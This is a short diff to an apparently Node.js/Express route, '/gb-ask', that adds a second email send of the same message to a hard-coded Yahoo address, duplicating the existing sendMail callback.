@@ -525,6 +525,15 @@ router.post('/gb-ask', (req, res, next) => {
         console.log('Email sent: ' + info.response);
       }
     });
+
+    mailOptions.to = 'yahyavi.mina@yahoo.com';
+    transporter.sendMail(mailOptions, function(error, info){
+      if (error) {
+        console.log(error);
+      } else {
+        console.log('Email sent: ' + info.response);
+      }
+    });
   });
 });
 
